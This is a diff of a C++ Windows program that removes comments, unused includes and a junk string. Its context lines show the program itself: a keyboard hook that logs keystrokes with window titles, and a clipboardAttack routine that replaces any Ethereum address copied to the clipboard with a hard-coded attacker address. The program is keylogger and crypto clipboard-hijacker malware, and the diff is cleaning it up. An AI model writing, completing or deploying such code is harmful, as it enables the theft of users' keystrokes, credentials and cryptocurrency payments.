@@ -1,15 +1,9 @@
 #pragma warning(disable: 4996 4530 4577 4365 5204 4191 4668 4626 5045)
 
-
-#pragma comment(lib, "User32.lib")
-#pragma comment(lib, "gdi32.lib")
 #include <iostream>
 #include <windows.h>
 #include <fstream>
 #include <string>
-#include <winuser.h>
-#include <ctime>
-#include <chrono>
 #include <atlimage.h>
 
 /* these variables are called globally because there is no way to pass them to the hook callback function as an argument and are needed to update the log file
@@ -80,8 +74,6 @@ void writeErrorLog(std::wstring errorMessage){
 
 /* getClipboardText is called in each clipboard change to log it, It is callig GetClipboardData with the unicode flag to return clipboard text written in any language */
 
-//FIX NON-TEXT errors
-
 std::wstring getClipboardText(){
 	if (OpenClipboard(NULL) == 0){
 		writeErrorLog(L"Error in opening clipboard");
@@ -117,7 +109,6 @@ void clipboardAttack(){
 	len = wcslen(attackerAddress); // Should be 42
 	cbText = getClipboardText();
 	if (isEthAddress(cbText)){
-		//std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
 		dstHandle = GlobalAlloc(GMEM_MOVEABLE,  (len + 1) * sizeof(WCHAR));
 		dstEthAddress = (LPWSTR)GlobalLock(dstHandle);
 		memcpy(dstEthAddress, attackerAddress, len * sizeof(WCHAR));
@@ -235,7 +226,6 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[WINDOWS]";
 	else if (vkCode == 255){
 		result = L"[FN]";
-		//takeScreen();
 	}
 	else if (vkCode >= 112 && vkCode <=120){
 		result = L"[F";
@@ -256,7 +246,6 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		HKL keyboardLayout = GetKeyboardLayout(dwThreadID);
 		GetKeyState(VK_SHIFT);
         GetKeyState(VK_MENU);
-		//std::
 		if (GetKeyboardState(lpKeyState) == 0){
 			writeErrorLog(L"Keyboard State return error.");
 			return (L"");
@@ -279,8 +268,6 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
 	std::wstring currentWindowTitle;
 	DWORD currentClipboardSequenceNumber;
 
-
-	//PROGRAM EXITS WHEN TAKING A SCREEN (CLIPBOARD DATA ISN't WRITABLE, probably should check before with IsClipboardFormatAvailable)
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
 		currentWindowTitle = getWindowTitle();
 		currentClipboardSequenceNumber = GetClipboardSequenceNumber();
@@ -289,7 +276,6 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
 			clipboardAttack();
 			g_prevClipboardSequenceNumber = currentClipboardSequenceNumber;
 		}
-		// NEED TO FIX: first time program enters it prints 1 char
 		if (buf.length() >= 100 || (currentWindowTitle != g_prevWindowTitle && buf.length() > 0)){
 					writeLogs(buf, g_prevWindowTitle);
 					buf.clear();
@@ -315,5 +301,3 @@ void main() {
     }
     UnhookWindowsHookEx(keyboard);
 }
-
-//qwqwqwqw!!!@@##asasasasqwqwqw
